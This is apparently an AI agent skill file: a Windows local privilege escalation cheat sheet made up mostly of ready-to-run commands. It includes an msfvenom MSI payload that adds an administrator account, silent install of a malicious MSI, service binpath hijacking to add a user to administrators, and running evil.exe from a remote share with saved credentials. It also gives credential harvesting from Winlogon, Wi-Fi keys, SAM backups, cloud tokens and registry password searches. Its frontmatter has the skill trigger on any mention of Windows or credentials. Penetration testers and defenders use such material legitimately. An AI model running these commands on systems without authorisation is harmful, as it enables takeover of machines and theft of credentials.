---
name: windows-local-privesc
description: Windows Local Privilege Escalation enumeration and exploitation. Use this skill whenever the user needs to enumerate privilege escalation vectors on a Windows system, check for misconfigurations, find credentials, or escalate from low privilege to SYSTEM. Trigger on requests about Windows privilege escalation, privesc enumeration, Windows security assessment, or when analyzing Windows systems for privilege escalation opportunities. Make sure to use this skill when the user mentions Windows, privilege escalation, SYSTEM access, service misconfigurations, credential harvesting, or any Windows security testing scenario.
---

# Windows Local Privilege Escalation

A comprehensive guide for enumerating and exploiting Windows local privilege escalation vectors.

## Quick Start

**Best tool for Windows local privilege escalation:** [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## System Information Enumeration

### Version and Patch Information

Check Windows version and installed patches for known vulnerabilities:

```bash
# CMD
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

# PowerShell
[System.Environment]::OSVersion.Version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}
Get-Hotfix -description "Security update"
```

### Exploit Suggestion Tools

**On the system:**
- `post/windows/gather/enum_patches` (Metasploit)
- `post/multi/recon/local_exploit_suggester` (Metasploit)
- [Watson](https://github.com/rasta-mouse/Watson)
- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

**Locally with system information:**
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [wesng](https://github.com/bitsadmin/wesng)

## Environment and Credential Enumeration

### Environment Variables

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell History

```bash
# Find history path
ConsoleHost_history

# Read history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Logging Checks

```bash
# Transcript logging
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription

# Module logging
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging

# Script Block logging
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging

# View PowerShell events
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

## WSUS Vulnerabilities

### Check for Non-SSL WSUS

```bash
# CMD
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

# PowerShell
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

If WUServer uses `http://` (not `https://`) and `UseWUServer` equals `1`, the system may be exploitable via tools like [Wsuxploit](https://github.com/pimps/wsuxploit) or [pyWSUS](https://github.com/GoSecure/pywsus).

### CVE-2020-1013 (WSUSpicious)

If you can modify local user proxy settings and WSUS uses IE proxy settings, you can intercept WSUS traffic. Use [WSUSpicious](https://github.com/GoSecure/wsuspicious) to exploit.

## AlwaysInstallElevated

If both registry keys are set to `0x1`, users can install MSI files as SYSTEM:

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploitation Methods

**Metasploit payload:**
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
```

**PowerUp:**
```powershell
Write-UserAddMSI
```

**Install silently:**
```bash
msiexec /quiet /qn /i C:\path\to\malicious.msi
```

## Service Enumeration and Exploitation

### List Services

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Check Service Permissions

```bash
# Check specific service
sc qc <service_name>

# Check permissions with accesschk
accesschk.exe -ucqv <Service_Name>
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula
```

### Modify Service Binary Path

If you have `SERVICE_ALL_ACCESS` or `WRITE_DAC` permissions:

```bash
sc config <Service_Name> binpath= "C:\path\to\malicious.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
```

### Restart Service

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

### Unquoted Service Paths

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '"'

# PowerUp
Get-ServiceUnquoted -Verbose
```

### Service Binary Permissions

```bash
# Check binary permissions
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

## User and Group Enumeration

### Enumerate Users and Groups

```bash
# CMD
net users %username%
net users
net localgroup
net localgroup Administrators
whoami /all

# PowerShell
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Password Policy

```bash
net accounts
```

## Credential Harvesting

### Winlogon Credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```

### Credential Manager

```bash
cmdkey /list

# Use saved credentials
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

### DPAPI Master Keys

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect\

# Credentials files
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

### PowerShell Credentials

```powershell
$credential = Import-Clixml -Path 'C:\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

### WiFi Passwords

```bash
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

# Extract all WiFi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### Sticky Notes

```bash
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

### SSH Keys in Registry

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

### Unattended Files

```bash
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\unattend.txt
C:\unattend.inf

# Search for unattended files
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

### SAM and SYSTEM Backups

```bash
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Cloud Credentials

```bash
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### Generic Password Search

```bash
# Search file contents
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

# Search registry
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

## Security Controls Enumeration

### WDigest

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Cached Credentials

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## PATH DLL Hijacking

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

## Network Enumeration

### Shares

```bash
net view
net view /all /domain [domainname]
net view \\computer /ALL
net use x: \\computer\share
net share
```

### Network Configuration

```bash
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Open Ports

```bash
netstat -ano
```

### Hosts File

```bash
type C:\Windows\System32\drivers\etc\hosts
```

## Known Vulnerabilities

### CVE-2019-1388 (hhupd.exe UAC Bypass)

Affects Windows 7 SP1 through Windows 10 1607. Exploit available at: https://github.com/jas502n/CVE-2019-1388

### Veeam CVE-2023-27532

Veeam B&R < 11.0.1.1261 exposes TCP/9401 allowing SYSTEM command execution.

### KrbRelayUp

Local privilege escalation in domain environments with specific conditions. Exploit: https://github.com/Dec0ne/KrbRelayUp

## Useful Tools

| Tool | Type | Description |
|------|------|-------------|
| WinPEAS | All-in-one | Comprehensive privesc enumeration |
| Watson | Executable | Known vulnerability detection |
| PowerUp | PowerShell | Misconfiguration checks |
| PrivescCheck | PowerShell | Privilege escalation checks |
| SeatBelt | Executable | Host enumeration |
| SharpUP | Executable | PowerUp port to C# |
| LaZagne | Executable | Credential extraction |
| SessionGopher | PowerShell | Session credential extraction |

## References

- [HackTricks Windows Privesc](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
- [PayloadsAllTheThings Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [Pentest Blog Windows Privesc](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
